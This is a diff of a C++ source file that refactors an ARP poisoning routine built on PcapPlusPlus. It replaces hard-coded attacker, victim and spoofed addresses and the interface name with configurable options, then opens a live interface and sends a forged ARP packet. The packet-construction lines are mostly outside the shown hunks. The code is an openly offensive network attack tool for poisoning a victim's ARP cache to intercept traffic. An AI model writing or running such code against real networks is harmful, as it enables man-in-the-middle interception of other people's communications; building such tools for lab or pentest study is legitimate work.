@@ -1,35 +1,30 @@
-#include "helper/help.h"
-#include <EthLayer.h>
-#include <IpAddress.h>
-#include <MacAddress.h>
-#include <PcapLiveDeviceList.h>
-#include <core.h>
+#include "arp_poisoning.h"
+#include "EthLayer.h"
+#include "IpAddress.h"
+#include "MacAddress.h"
+#include "PcapLiveDeviceList.h"
 #include <iostream>
 
-const int MAX_PACKET_LEN = 100;
+constexpr int MAX_PACKET_LEN = 100;
 
-namespace ARP {
-void useHelper() { help(); }
+int ARP::poisonArp(ArpPoisoningOptions &options) {
+    pcpp::MacAddress macAttacker(options.macAttacker);
+    pcpp::IPv4Address ipAttacker(options.ipAttacker);
 
-void poisonArp() {
-    pcpp::MacAddress macAttacker("bc:24:11:e3:98:26");
-    pcpp::IPv4Address ipAttacker("10.71.2.7");
+    pcpp::MacAddress macVictim(options.macVictim);
+    pcpp::IPv4Address ipVictim(options.ipVictim);
 
-    pcpp::MacAddress macVictim("bc:24:11:ef:65:94");
-    pcpp::IPv4Address ipVictim("10.71.2.6");
-
-    pcpp::IPv4Address ipToSpoof("10.71.2.5");
+    pcpp::IPv4Address ipToSpoof(options.ipToSpoof);
 
     // Open interface
     pcpp::PcapLiveDevice *dev =
         pcpp::PcapLiveDeviceList::getInstance().getPcapLiveDeviceByName(
-            "ens18");
+            options.interface);
 
     if (dev == nullptr || !dev->open()) {
         std::cerr << "Unable to open interface ens18" << "\n";
 
-        // Entrypoint is not multi threaded
-        std::exit(1); // NOLINT(concurrency-mt-unsafe)
+        return 1;
     }
 
     // Build ARP spoofing packet
@@ -47,5 +42,6 @@ void poisonArp() {
     dev->sendPacket(&packet);
 
     dev->close();
+
+    return 0;
 }
-} // namespace ARP
